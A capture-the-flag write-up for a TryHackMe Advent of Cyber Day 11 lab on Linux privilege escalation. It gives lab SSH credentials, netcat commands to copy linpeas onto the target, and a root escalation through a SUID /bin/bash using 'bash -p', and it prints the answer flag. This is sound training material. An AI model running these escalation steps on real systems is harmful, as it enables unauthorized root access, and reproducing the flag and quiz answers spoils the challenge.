# IP=10.10.149.218


### [Day 11] Networking - The Rogue Gnome ###

1. What type of privilege escalation involves using a user account to execute commands as an administrator?

```
vertical
```

2. What is the name of the file that contains a list of users who are a part of the sudo group?

```
sudoers
```

3. Use SSH to log in to the vulnerable machine like so: `ssh cmnatic@$IP`. Input the following password when promted: `aoc2020`.

	* Command: `ssh cmnatic@$IP` + `aoc2020`

4. Enumerate the machine for executables that have had the SUID permission set. Look at the output and use a mixture of GTFObins and your researching skills to learn how to exploit this binary.

	* Notes:
		* Using linpeas.sh to enumerate.
		* Found the `/bin/bash` has root SUID permission. This means that running `/bin/bash` as any user will force the system to run it as root.

	* Commands:
		* Download linpeas.sh onto victim:
			* Local: `nc -w 3 $IP 1337 < linpeas.sh`
			* Victim: `nc -lp 1337 > linpeas.sh`
		* Change linpeas to executable: `chmod +x linpeas.sh`
		* Run linpeas: `./linpeas.sh | tee linpeas.log`

5. What are the contents of the file located at /root/flag.txt?

	* Notes:
		* After enumerating the server using linpeas, I found a vulnerabilty with /bin/bash.
		* Looked at GTFOBins for any exploitations using /bin/bash to get root priviledges.
			* https://gtfobins.github.io/gtfobins/bash/

	* Commands:
		* Escalate to root: `bash -p`

	* Answer:
	```
	thm{2fb10afe933296592}
	```
